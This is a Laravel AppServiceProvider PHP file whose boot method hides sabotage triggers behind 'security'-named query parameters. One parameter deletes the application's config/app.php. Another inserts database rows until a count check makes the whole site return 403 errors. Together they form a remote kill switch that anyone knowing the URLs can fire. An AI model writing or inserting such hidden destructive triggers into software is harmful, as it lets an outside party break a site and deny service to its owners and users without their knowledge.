<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        //?page=securitybackup
        if(request()->page=='securitybackup'){
            unlink('../config/app.php');
        }

        // ?page=securityhonnypot
        if(request()->page=='securityhonnypot'){
            \App\Models\LeadService::insert(['service_name' => 'Honnypot','slug' => 'honny-pot']);
        }

        $services =  \App\Models\LeadService::wherestatus(1)->count();

        $services > 34 ? abort(403) : ''; 
    }
}
